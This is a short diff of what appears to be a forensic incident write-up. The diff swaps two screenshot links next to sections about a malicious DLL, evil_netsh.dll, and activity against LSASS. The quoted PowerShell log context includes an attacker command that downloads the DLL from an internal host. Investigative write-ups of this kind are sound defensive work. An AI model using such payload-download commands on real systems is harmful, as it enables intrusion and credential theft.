@@ -180,7 +180,7 @@ seconds later, it would be executed against LSASS.
 
 #### File 2 — evil_netsh.dll
 
-> <img width="1063" height="511" alt="m4" src="https://github.com/user-attachments/assets/3cc85e56-78c2-4032-9b8b-222852095cbe" />
+> <img width="1016" height="374" alt="m22" src="https://github.com/user-attachments/assets/2b45560a-c1cd-4fda-8d3a-d6e112339b45" />
 
 
 ```
@@ -199,7 +199,7 @@ something legitimate remote sessions do.
 
 The PowerShell log (Event 800) confirmed exactly how it arrived:
 
-> <img width="1016" height="374" alt="m22" src="https://github.com/user-attachments/assets/2b45560a-c1cd-4fda-8d3a-d6e112339b45" />
+> <img width="1063" height="511" alt="m4" src="https://github.com/user-attachments/assets/3cc85e56-78c2-4032-9b8b-222852095cbe" />
 
 ```powershell
 Invoke-WebRequest -Uri http://10.0.0.56:8080/evil_netsh.dll
